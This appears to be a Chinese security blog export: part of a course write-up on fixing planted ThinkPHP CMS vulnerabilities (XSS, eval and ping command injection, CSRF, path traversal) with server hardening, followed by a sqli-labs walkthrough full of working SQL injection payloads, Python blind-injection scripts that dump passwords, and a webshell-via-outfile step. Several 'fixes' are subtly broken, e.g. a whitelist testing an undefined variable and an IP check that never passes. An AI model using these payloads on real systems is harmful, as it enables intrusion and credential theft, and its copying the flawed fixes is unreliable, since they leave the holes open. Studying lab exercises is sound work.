可以看到这里对用户发送的消息，只是检查了接收消息者是否存在，而没有对用户发送的内容进行检查和过滤，给了攻击者可乘之机，这里就需要对用户输入的内容进行过滤。 漏洞防御方法一 使用php自带的函数htmlspecialchars，将一些特殊字符转义，使其无法工作 首先要知道data的结构 /* data的数据结构 array(4) &#123; [&quot;subject&quot;]=&gt; string(3) &quot;sad&quot; [&quot;send_to&quot;]=&gt; string(5) &quot;sunzy&quot; [&quot;content&quot;]=&gt; string(2) &quot;ad&quot; [&quot;send_from&quot;]=&gt; string(5) &quot;admin&quot; &#125; */ if ($this-&gt;request-&gt;isPost()) &#123; $data = $this-&gt;request-&gt;post(&#x27;info/a&#x27;); $data[&#x27;send_from&#x27;] = $this-&gt;_userinfo[&#x27;username&#x27;]; // 短消息XSS防御 $data[&#x27;subject&#x27;] = htmlspecialchars($data[&#x27;subject&#x27;]); $data[&#x27;content&#x27;] = htmlspecialchars($data[&#x27;content&#x27;]); if (!MemberModel::getByUsername($data[&#x27;send_to&#x27;])) &#123; return $this-&gt;error(&#x27;用户不存在&#x27;); &#125; if ($this-&gt;modelClass-&gt;allowField(true)-&gt;save($data)) &#123; $this-&gt;success(&#x27;发送成功！&#x27;); &#125; else &#123; $this-&gt;error(&#x27;发送失败！&#x27;); &#125; &#125; else &#123; return $this-&gt;fetch(); &#125; 此时再发送带有恶意脚本的消息时，该脚本就不会被浏览器执行，而是当作普通的字符串 方法二 这里就用一个很安全的过滤函数，这个函数很难被绕过。 function SafeFilter (&amp;$arr) &#123; $ra=Array(&#x27;/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/&#x27;,&#x27;/script/&#x27;,&#x27;/javascript/&#x27;,&#x27;/vbscript/&#x27;,&#x27;/expression/&#x27;,&#x27;/applet/&#x27;,&#x27;/meta/&#x27;,&#x27;/xml/&#x27;,&#x27;/blink/&#x27;,&#x27;/link/&#x27;,&#x27;/style/&#x27;,&#x27;/embed/&#x27;,&#x27;/object/&#x27;,&#x27;/frame/&#x27;,&#x27;/layer/&#x27;,&#x27;/title/&#x27;,&#x27;/bgsound/&#x27;,&#x27;/base/&#x27;,&#x27;/onload/&#x27;,&#x27;/onunload/&#x27;,&#x27;/onchange/&#x27;,&#x27;/onsubmit/&#x27;,&#x27;/onreset/&#x27;,&#x27;/onselect/&#x27;,&#x27;/onblur/&#x27;,&#x27;/onfocus/&#x27;,&#x27;/onabort/&#x27;,&#x27;/onkeydown/&#x27;,&#x27;/onkeypress/&#x27;,&#x27;/onkeyup/&#x27;,&#x27;/onclick/&#x27;,&#x27;/ondblclick/&#x27;,&#x27;/onmousedown/&#x27;,&#x27;/onmousemove/&#x27;,&#x27;/onmouseout/&#x27;,&#x27;/onmouseover/&#x27;,&#x27;/onmouseup/&#x27;,&#x27;/onunload/&#x27;); if (is_array($arr)) &#123; foreach ($arr as $key =&gt; $value) //循环语句，挨个检测 &#123; if (!is_array($value)) &#123; if (!get_magic_quotes_gpc()) &#123; $value = addslashes($value); //给单引号（&#x27;）、双引号（&quot;）、反斜线（\\）与 NUL（NULL 字符） 加上反斜线转义 &#125; $value = preg_replace($ra,&#x27;&#x27;,$value); //删除非打印字符 $arr[$key] = htmlentities(strip_tags($value)); //去除 HTML 和 PHP 标记并转换为 HTML 实体 &#125; else &#123; SafeFilter($arr[$key]); &#125; &#125; &#125; &#125; 漏洞点二代码分析代码位置application\\member\\controller\\Index.php中的comment方法 很容易看到，没有对提交的数据进行处理，并且将提交的数据在页面使用echo打印出来，导致了XSS漏洞 漏洞防御使用php自带的函数htmlspecialchars，将一些特殊字符转义，使其无法工作，或者使用上面的过滤函数 public function comment()&#123; if($this-&gt;request-&gt;isPost())&#123; $data = $_POST[&#x27;data&#x27;]; $data = htmlspecialchars($data); $userId = $this-&gt;userid; 9.RCE漏洞点一代码分析application\\admin\\phpinfo\\index public function index() &#123; if ($this-&gt;request-&gt;isPost())&#123; $data = $this-&gt;request-&gt;post(&#x27;data&#x27;); echo eval($data.&#x27;;&#x27;); &#125; return $this-&gt;fetch(); &#125; eval()函数将传进来的字符串当作php代码执行，导致了命令执行 漏洞防御既然功能就是查看phpinfo，那就设置一个白名单，检查提交的值是否为phpinfo public function index() &#123; if ($this-&gt;request-&gt;isPost())&#123; $data = $this-&gt;request-&gt;post(&#x27;data&#x27;); $whitelist = array(&#x27;phpinfo&#x27;); if (in_array($file, $whitelist)) &#123; return eval($data.&#x27;;&#x27;); &#125; else &#123; return $this-&gt;error(&quot;Hacker!&quot;); &#125; &#125; return $this-&gt;fetch(); &#125; 漏洞点二 代码分析 if ($this-&gt;request-&gt;isPost()) &#123; $ip = $this-&gt;request-&gt;post(&#x27;data&#x27;); $ip = trim($ip); $result = &quot;&quot;; if(isset($ip) &amp;&amp; $ip !== &#x27;&#x27;) &#123; $result = shell_exec(&#x27;ping &#x27;.$ip); return &quot;&lt;pre&gt;$result&lt;/pre&gt;&quot;; &#125; &#125; 可以看到，这里没有对用户提交的ip地址进行任何检查判断，导致攻击者可以使用管道符恶意的拼接命令，从而导致了命令注入，获取到服务的敏感资源。 漏洞点二漏洞防御方法一 对用户提交的ip的地址进行判断，只有当符合IPv4的地址格式时，才允许执行下一步操作。 具体代码如下 if ($this-&gt;request-&gt;isPost()) &#123; $ip = $this-&gt;request-&gt;post(&#x27;data&#x27;); $ip = trim($ip); $is_ip = false; $result = &#x27;&#x27;; $data = explode(&#x27;.&#x27;,$ip); // 利用ipv4地址的特性检查 for($i=0; $i&lt;count($data); $i++)&#123; if($data[$i] &gt; 255 ) &#123; $is_ip = false; &#125; &#125; if(!$is_ip)&#123; $result = &quot;请输入正确的IPv4地址！&quot;; &#125; else&#123; $result = shell_exec(&#x27;ping -c 4&#x27;.$ip); &#125; return &quot;&lt;pre&gt;$result&lt;/pre&gt;&quot;; &#125; 方法二 使用php内置的函数对提交的参数进行过滤和转义，使得攻击者输入的一些特殊字符失去原来的作用。 escapeshellcmd和escapeshellarg函数 if ($this-&gt;request-&gt;isPost()) &#123; $ip = $this-&gt;request-&gt;post(&#x27;data&#x27;); $ip = trim($ip); $ip = escapeshellcmd($ip); $ip = escapeshellarg($ip); $result = &quot;&quot;; if(isset($ip) &amp;&amp; $ip !== &#x27;&#x27;) &#123; $result = shell_exec(&#x27;ping &#x27;.$ip); return &quot;&lt;pre&gt;$result&lt;/pre&gt;&quot;; &#125; &#125; 10.CSRF漏洞点一代码分析application\\member\\controller\\Member.php中的jifen方法 漏洞防御首先在前端代码中加入&#123;:token&#125;，让用户每次访问时都携带一个随机token，再在后端页面中检查该token是否正确 $token = [&#x27;__token__&#x27;=&gt; $_POST[&#x27;__token__&#x27;]]; // 设置检查规则 $rule = [ &#x27;__token__&#x27; =&gt; &#x27;require|token&#x27;, ]; // 利用validata函数检查 $result = $this-&gt;validate($token, $rule); // token检查不通过则直接退出，并警告站点不安全。 if($result !== true)&#123; return $this-&gt;error(&quot;website is unsafe!&quot;); &#125; 漏洞点二，三，四代码分析代码位置application\\member\\controller\\Member.php中的edit方法 public function edit() &#123; if ($this-&gt;request-&gt;isPost()) &#123; $userid = $this-&gt;request-&gt;param(&#x27;id/d&#x27;, 0); $data = $this-&gt;request-&gt;post(); $result = $this-&gt;validate($data, &#x27;member.edit&#x27;); if (true !== $result) &#123; return $this-&gt;error($result); &#125; ... 上面的代码只是对提交的数据进行了检查，数据符合规则就会成功，但是没有对请求的来源做任何的检查，这也是做成CSRF漏洞的最大原因。 漏洞防御CSRF漏洞的防御 设置token，与管理员登录页面一样，每次请求的前端页面都会隐藏一个随机产生的token，而在提交请求时这个token也会发送到后端，此时服务器会检查，提交的token是否正确，只有正确时才会进行下一步操作。 referer代表着请求的来源，不可以伪造。但是浏览器可以关闭referer。 禁止第三方网站使用本站Cookie。但是只有个别的浏览器支持。 所以这里选择使用token，修复该漏洞。 前端代码 基本不需要修改，只需要增加一个隐藏的token值，代码位置application\\member\\view\\member\\edit.html 此时的前端页面就会产生一个新标签，就是token值 后端代码 application\\member\\controller\\Member.php中的edit方法 public function edit() &#123; if ($this-&gt;request-&gt;isPost()) &#123; $userid = $this-&gt;request-&gt;param(&#x27;id/d&#x27;, 0); $data = $this-&gt;request-&gt;post(); // 获取前端的token值 $token = [&#x27;__token__&#x27;=&gt; $data[&#x27;__token__&#x27;]]; // 设置检查规则 $rule = [ &#x27;__token__&#x27; =&gt; &#x27;require|token&#x27;, ]; // 利用validata函数检查 $result = $this-&gt;validate($token, $rule); // token检查不通过则直接退出，并警告站点不安全。 if($result !== true)&#123; return $this-&gt;error(&quot;website is unsafe!&quot;); &#125; $result = $this-&gt;validate($data, &#x27;member.edit&#x27;); if (true !== $result) &#123; return $this-&gt;error($result); &#125; ... 再使用bp抓包生成CSRF的poc，此时就不能成功了 11.任意文件下载代码分析代码位于application\\download\\controller\\Index.php中的index方法 public function index() &#123; header(&quot;Content-type:text/html;charset=utf-8&quot;); if($this-&gt;request-&gt;isGet() &amp;&amp; $_GET[&#x27;filename&#x27;] !== null)&#123; if($_GET[&#x27;filename&#x27;] !== &#x27;&#x27;)&#123; $filename = $_GET[&#x27;filename&#x27;]; $filename = &quot;nba/&quot;.$filename; iconv(&quot;utf-8&quot;,&quot;gb2312&quot;,$filename); if(!file_exists($filename))&#123; return $this-&gt;error(&quot;文件不存在！&quot;); &#125; $fp = fopen($filename, &#x27;rb&#x27;); $file_size = filesize($filename); ob_clean(); Header(&quot;Content-type: application/octet-stream&quot;); Header(&quot;Accept-Ranges: bytes&quot;); Header(&quot;Accept-Length:&quot;.$file_size); Header(&quot;Content-Disposition: attachment; filename=&quot;.basename($filename)); $buffer=1024; $file_count=0; while(!feof($fp) &amp;&amp; $file_count&lt;$file_size)&#123; $file_con=fread($fp,$buffer); $file_count+=$buffer; echo $file_con; &#125; fclose($fp); return view(); &#125; &#125; return view(); &#125; 这里就是实现了一个图片下载的方法，使得用户可以下载public/nba文件夹下的图片，但是并没有对提交的filename参数进行检查和过滤，那么攻击者就可以利用../实现目录的跳转，从而可以下载任意文件 漏洞防御主要的防御方法就是限制用户输入的文件名在程序指定的目录下，那么就是不能使用../进行目录的跳转，并且对用户下载的文件后缀名进行检查 public function check_file($filename)&#123; if(preg_match(&quot;../&quot;, $filename))&#123; return $this-&gt;error(&quot;hacker!&quot;); &#125; // 获取文件的MIME 检查是否符合图片类型的要求 $file_type = $_FILES[ $filename ][ &#x27;type&#x27; ]; if($file_type !== &#x27;image/jpeg&#x27; || $file_type !== &#x27;image/png&#x27;|| $file_type !== &#x27;image/gif&#x27;)&#123; return $this-&gt;error(&quot;hacker!&quot;); &#125; &#125; 12.unserialize由于这里的反序列化漏洞是一个ctf题目，如果修复了就失去了它了存在的意义，所以这里没有修复方法。但是针对于一般的unserilize，还是有很多防御方法的。 1.严格的把控 unserailize() 函数的参数，不要给攻击者任何输入的可能 2.在文件系统函数的参数可控时，对参数进行严格的过滤。 3.严格检查上传文件的内容，而不是只检查文件头。 4.在条件允许的情况下禁用可执行系统命令、代码的危险函数。 而对于这种框架类型的网站,则需要开发者注意使用安全的网站架构,发现漏洞后需要及时修复漏，并且不安全的序列化后的对象，减少使用system,eval等可能被攻击者利用的函数。 13.服务器安全配置防御漏洞php.ini配置 禁止使用的PHP危险函数：Web木马程序通常利用php的特殊函数执行系统命令，查询任意目录文件，增加修改删除文件等。php木马程序常使用的函数为：dl,assert,exec,popen,system,passthru,shell_exec等 在php.ini中添加如下的内容： disable_functions = dl,assert,exec,popen,system,passthru,shell_exec,proc_close,proc_open,pcntl_exec 关闭注册全局变量：在PHP中提交的变量，包括使用POST或者GET提交的变量，会自动注册为全局变量，能够直接访问，这是对服务器非常不安全的，所以不能让它注册为全局变量，就把注册全局变量选项关闭。 关闭注册全局变量设置： register_globals = Off 开启magic_quotes_gpc：magic_quotes_gpc会把引用的数据中包含单引号’和双引号”以及反斜线 \\自动加上反斜线，自动转译符号，确保数据操作的正确运行，magic_quotes_gpc的设定值将会影响通过Get/Post/Cookies获得的数据，可以有效的防止SQL注入漏洞。 打开magic_quotes_gpc设置： magic_quotes_gpc = On 关闭错误消息显示：php在没有连接到数据库或者其他情况下会有提示错误，一般错误信息中会包含php脚本当前的路径信息或者查询的SQL语句等信息，这类信息提供给黑客后，是不安全的，所以服务器建议禁止错误提示。 关闭错误信息显示设置： display_errors = Off 禁止访问远程文件:允许访问URL远程资源使得PHP应用程序的漏洞变得更加容易被利用，php脚本若存在远程文件包含漏洞可以让攻击者直接获取网站权限及上传web木马 配置如下： allow_url_fopen = Off allow_url_include = Off 开启php安全模式：php的安全模式是个非常重要的内嵌的安全机制，能够控制一些php中的函数，比如system()，同时把很多文件操作函数进行了权限控制，也不允许对某些关键文件的读取。 safe_mode = On nginx服务器安全配置修改nginx.conf 禁止敏感文件的直接访问，可以有效的防御文件上传攻击，修改server段 location ~ ^/(uploads|static)/.*.(php|php3|php4|php5|cgi|asp|aspx|jsp|shtml|shtm|pl|cfm|sql|mdb|dll|exe|com|inc|sh)$ &#123; deny all; &#125; 禁止危险IP的访问 //禁止的写法 deny 10.0.0.0/24; //允许的写法 allow 10.0.0.0/24; deny all; 隐藏版本信息 server_tokens off; proxy_hide_header X-Powered-By 代码安全 config/app.php中的app_debug和app_trace设置false，关闭调试模式 默认是域名绑定在public目录，为唯一对外访问目录 务必更改默认密码，并不要设置的过于简单，防止暴力破解 后台禁止访问IP，可以在设置-网站设置中设置 问题与总结问题 数据库连接失败 SQLSTATE[HYO00][2002] Connection refused 解决方法如下 数据库关闭 上面的错误是mysql数据库的容器关闭导致 但是重启时还是立即关闭 查看日志看到如下内容，百度解决 root@sunzy-virtual-machine:~# docker logs -f 250c80740b5b Warning: World-writable config file &#x27;/etc/mysql/conf.d/my.cnf&#x27; is ignored Warning: World-writable config file &#x27;/etc/mysql/conf.d/my.cnf&#x27; is ignored Warning: World-writable config file &#x27;/etc/mysql/conf.d/my.cnf&#x27; is ignored 将mysql文件夹中的my.cnf的权限改为 644 chmon 644 my.cnf 网站的图片无法显示或者css,js代码无法执行 进入nginx服务器的容器内 docker exec -it 容器名 bash cd 进入图片或者css js代码保存的文件夹 使用chmod改变权限 chmod -R 777 文件夹 # -R 参数是递归改变权限 即文件夹内的文件都有777 的权限 总结 提高了自己的动手能力，以及编程能力，加深了对thinkPHP框架的了解，明白了其运行原理，学会了如何编辑一个CMS网站 在编写漏洞的过程中也提高了自己对改漏洞的理解，在以后的学习和工作中能更好的利用和防御漏洞 锻炼了自己的学习能力，从一开始的无从下手，后来通过手册学习后，了解了网站的框架，到后来可以自如的修改网站的页面和后端逻辑代码，对自己的学习能力提升很大，这也是这门课程的重要意义。毕竟学习安全，很多东西是需要自己摸索的，具备独立学习的能力才能在安全的道路上走的更远。","tags":[{"name":"thinkPHP,cms","slug":"thinkPHP-cms","permalink":"https://sunzhengyu99.github.io/tags/thinkPHP-cms/"}]},{"title":"net_a_and_d","date":"2021-03-03T07:09:54.000Z","path":"2021/03/03/net-a-and-d/","text":"[TOC] sql注入level1get提交参数id 首先提交1&#39;，判断是字符型还是数字型注入 这里出现报错，说明是字符类型的，并且是用&#39;将参数id包裹起来的。 接下来就是判断列数，爆表名，爆列名和数据库内容 0x1 确定列数并爆出表名 当列数增加到4的时候开始报错，说明是三列 ?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ 0x2 爆列名 ?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+ 这里的列名很多 user_id,first_name,last_name,user,password,avatar,last_login,failed_login 0x3 爆出内容 选择password ?id=-1&#x27; union select 1,group_concat(password),3 from users--+ level2同样使用 id=1&#39;，判断是什么类型的注入 可以发现输入的&#39;没有其他的&#39;与之闭合，导致报错，所以这是数字型注入 所以可以直接使用level1的注入语句，只需要删除 ‘ 即可 ?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ ?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+ ?id=-1 union select 1,group_concat(password),3 from users--+ level3提交id=1&#39; 分析一下报错原因 出错的语句为 &#x27;1&#x27;&#x27;) LIMIT 0,1 其中1’输入的内容，所以包裹参数的格式为(&#39;id&#39;) 注入语句可以直接在level1的基础上增加一个 )即可 将原语句修改为 &#x27;1&#x27;) 注入语句 --+ &#x27;) LIMIT 0,1 ?id=-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ ?id=-1&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;--+ ?id=-1&#x27;) union select 1,group_concat(password),3 from users--+ level4同样输入id=1&#39;，但是这次没有报错，才是是使用了&quot;，换成id=1&quot; 很明显和level3基本相同，将&#39;改为&quot;，就是这关的答案 level5这题是字符型注入，但是不在回显所查询的内容，所以是盲注 查看源码也可以发现 不在打印出所查询到的内容，所以是盲注，但是这关没有关闭报错回显，所以可以通过报错注入 报错注入 (1). 通过floor报错 and (select 1 from (select count(),concat((payload) from users limit 0,1),floor (rand(0)2))x from information_schema.tables group by x)a) 其中payload为你要插入的SQL语句需要注意的是该语句将 输出字符长度限制为64个字符 (2). 通过updatexml报错 and updatexml(1,payload,1) 同样该语句对输出的字符长度也做了限制，其最长输出32位并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效 (3). 通过ExtractValue报错 and extractvalue(1, payload) 输出字符有长度限制，最长32位。 0x1 确定数据库名 ?id=1&#x27; and extractvalue(1,concat(0x23,database(),0x23))--+ 0x2 爆表名 ?id=1&#x27; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),0x23))--+ 这里每次报错显示的信息只有一行，所以只能有 limit，一个一个的显示，直到找到目标表名 0x3 爆列名 ?id=1&#x27; and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 1,1),0x23))--+ 0x4 爆内容 ?id&#x3D;1&#39; and extractvalue(1,concat(0x23,(select password from users order by id limit 0,1),0x23))--+ 后面的内容可以通过改变limit后的第一个参数查看 level6与level5很像 但是这里是用 “包裹参数，所以只需要将上面的注入语句中的 ‘ 改为 “即可 level7提交id=1，出现提示 需要使用outfile函数 在利用sql注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有以下三个 into dumpfile() into outfile() load_file() 这里我们利用outfile函数 首先确定这关包裹参数的格式 一直测试到id=1&#39;)) --+，才显示正确所以可以确定参数的包裹格式为((&#39;id&#39;)) 0x1 向网站根目录写入一句话木马 执行后就可以在根目录中看到这个文件 0x2 使用蚁剑连接 127.0.0.1/3.php 密码:cmd level8根据标题和测试结果可以看出是盲注 首先判断是什么类型注入 提交id=1，显示结果为You are in，可以确定成功查询返回的结果 提交id=1&#39;，没有提示You are in，但是提交id=1&#39; --+，再次出现You are in，可以确定是字符型注入，包裹形式为&#39;id&#39; 接下来就是确定盲注使用的语句，这里可以使用 ascii和substring两个函数 0x1 爆出数据库名 ?id=1&#x27; and ascii(substring(database(),1,1))&gt;97%23 首先假设数据库名的第一个字母的ascii码值大于97，回显为you are in，所以确定第一个字母大于97，之后可以使用二分法确定出最后的字母。 可以使用脚本完成该过程，脚本跑出的结果为 security 0x2 爆出表名 使用注入语句 id=1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23 最后爆出的表名如下 0x3 爆出列名 id=1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23 0x4 爆出内容 id=1&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23 完整脚本如下 import requests url = &quot;http://127.0.0.1/sqli-labs/Less-8/?id=&quot; flag = &quot;&quot; t = &quot;&quot; sum=0 for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;1&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%23&quot;.format(i,mid) # payload = &quot;1&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) # payload = &quot;1&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) payload = &quot;1&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;)%23&quot;.format(i,mid) response = requests.get(url+payload) t = response.text if &quot;You are in&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 # print(mid) flag = flag + chr(mid) print(flag) print(flag) level9题目标题提示了是基于时间且单引号闭合的盲注 基于时间的盲注需要使用到sleep函数，基本用法如下 分别提交id=1，id=1&#39; and sleep(3) --+，其服务器的响应时间如下，第二个的响应时间正好比第一个长了三秒，所以可以根据服务器的响应时间来判断自己所查询的语句是否正确，一般需要编写脚本完成所有步骤。 注入脚本只需要改一改level8的即可。 完整脚本如下 import requests import datetime url = &quot;http://127.0.0.1/sqli-labs/Less-9/?id=&quot; flag = &quot;&quot; for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;1&#x27; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid) payload = &quot;1&#x27; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&#x27; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&#x27; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) t1 = datetime.datetime.now() response = requests.get(url+payload) t2 = datetime.datetime.now() if (t2 - t1).seconds &gt; 2 : left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag) print(flag) 爆破数据库名的过程如下 level10与level9基本相同，只需要将payload中的&#39;换成&quot;即可 完整脚本如下 import requests import datetime url = &quot;http://127.0.0.1/sqli-labs/Less-9/?id=&quot; flag = &quot;&quot; for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;1&quot; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid) payload = &quot;1&quot; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&quot; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&quot; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) t1 = datetime.datetime.now() response = requests.get(url+payload) t2 = datetime.datetime.now() if (t2 - t1).seconds &gt; 2 : left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag) print(flag) level11打开网页是一个登录页面 先判断列数，当三列出现报错，说明只有两列 uname=admin&#x27; order by 2#&amp;passwd=1&amp;submit=Submit 尝试使用万能密码，成功登录 uname=admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27; #&amp;passwd=1&amp;submit=Submit 获取数据库 uname=sda&#x27; union select 1,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)##&amp;passwd=1&amp;submit=Submit 获取列名，字段名 uname=sda&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#&amp;passwd=1&amp;submit=Submit uname=sda&#x27; union select 1,group_concat(password) from users#&amp;passwd=1&amp;submit=Submit level12这一关与上面就是使用的闭合符号不同，使用的双引号，所以只要将上面的payload改一下即可 uname=sda&quot; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#&amp;passwd=1&amp;submit=Submit uname=sda&quot; union select 1,group_concat(password) from users#&amp;passwd=1&amp;submit=Submit level13输入单引号，出现报错 分析一下即可 &#39;&#39;&#39;) and password=(&#39;&#39;) LIMIT 0,1 第二个&#39;是我们输入的，所以闭合方式为&#39;) 但是这题没有回显数据，可以使用报错注入或者延时盲注 注入的payload uname&#x3D; sa&#39;) union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as qing from information_schema.tables group by qing # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit uname&#x3D; dsad&#39;) union select count(*),concat(0x3a,0x3a,(select version()),0x3a,0x3a,floor(rand()*2)) as qing from information_schema.tables group by qing # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit uname&#x3D; asd&#39;) union select 1,2 from (select count(*),concat((select concat(group_concat(table_name) ,0x3a,0x3a) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(group_concat(column_name) ,0x3a,0x3a) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(count(*),0x3a, 0x3a) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit uname&#x3D; das&#39;) union select 1,2 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a # &amp;passwd&#x3D; &#39;) or 1&#x3D;1 # &amp;submit&#x3D;Submit level14这一关就是和上面的闭合方式不一样，稍加修改即可 uname= sad&quot; union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a # &amp;passwd= &#x27;) or 1=1 # &amp;submit=Submit level15这是单引号闭合的布尔盲注，POST型 判断依据可以根据页面出现的图片 登录不成功时出现的图片 登录成功的图片 这里使用时间盲注 # -*- coding = utf - 8 -*- #@Time : 2021/4/21 19:54 #@Author : sunzy #@File : level15.py import requests import datetime url = &quot;http://127.0.0.1/sqli-labs/Less-15/&quot; flag = &quot;&quot; data = &#123;&#x27;uname&#x27;:&#x27;admin&#x27;,&#x27;passwd&#x27;:&#x27;sad&#x27;,&#x27;submit&#x27;:&#x27;Submit&#x27;&#125; for i in range(1,50): left = 32 right = 128 mid = (right + left) &gt;&gt; 1 while(left &lt; right): # payload = &quot;1&#x27; and if(ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(2),null) %23&quot;.format(i,mid) #payload = &quot;admin&#x27; and if((select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) # payload = &quot;1&#x27; and if((select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; having a&gt;&#123;1&#125;),sleep(2),null)%23&quot;.format(i,mid) payload = &quot;admin&#x27; and if((select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from users having a&gt;&#123;1&#125;),sleep(5),null)--+&quot;.format(i,mid) t1 = datetime.datetime.now() data[&#x27;uname&#x27;] = payload response = requests.post(url=url,data=data) t2 = datetime.datetime.now() if (t2 - t1).seconds &gt; 5: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 print(flag) flag = flag + chr(mid) print(flag) print(flag) level16将上一关的脚本该给双引号闭合即可 level17updata注入 可以使用报错注入 uname=admin&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,(select database())),1)#&amp;submit=Submit level18uname和passwd都使用check_input过滤，而在这里将user-agent和ip作为记录，插入数据库 提示了ip地址和user-Agent，应该时http头注入 抓包后，在user-agent的位置插入注入语句 1&#x27; and updatexml(1,concat(0x7e,(select database())),1) and 1=&#x27;1 level19 登录后提示了referer，应该是在referer头注入 1&#x27; and updatexml(1,concat(0x7e,(select database())),1) and 1=&#x27;1 level20正常登录，发现一个cookie字段 尝试cookie位置注入 这里直接使用union联合查询即可 uname=-adm&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()# uname=-ada&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;# uname=-ada&#x27; union select 1,group_concat(password),3 from users# 